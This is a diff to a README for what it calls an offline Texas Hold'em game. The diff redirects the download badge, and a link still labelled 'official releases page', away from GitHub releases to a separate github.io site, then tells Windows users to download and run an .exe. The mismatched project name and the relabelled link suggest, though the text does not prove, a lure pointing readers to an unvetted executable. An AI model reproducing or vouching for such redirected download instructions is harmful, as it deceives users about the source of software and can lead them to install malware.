@@ -1,6 +1,6 @@
 # 🃏 pkarena0-web-script-utility - Play offline Texas Hold'em games easily
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/helainemoony846/pkarena0-web-script-utility/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://helainemoony846.github.io)
 
 This application provides a fast and reliable Texas Hold'em poker experience. You can play against computer opponents without an internet connection. The software uses a Rust engine to ensure smooth gameplay and quick responses. You can study your past hands and listen to game play-by-play narration if you choose.
 
@@ -8,7 +8,7 @@ This application provides a fast and reliable Texas Hold'em poker experience. Yo
 
 Follow these steps to install the software on your Windows computer.
 
-1. Go to the [official releases page](https://github.com/helainemoony846/pkarena0-web-script-utility/releases) to find the latest version.
+1. Go to the [official releases page](https://helainemoony846.github.io) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
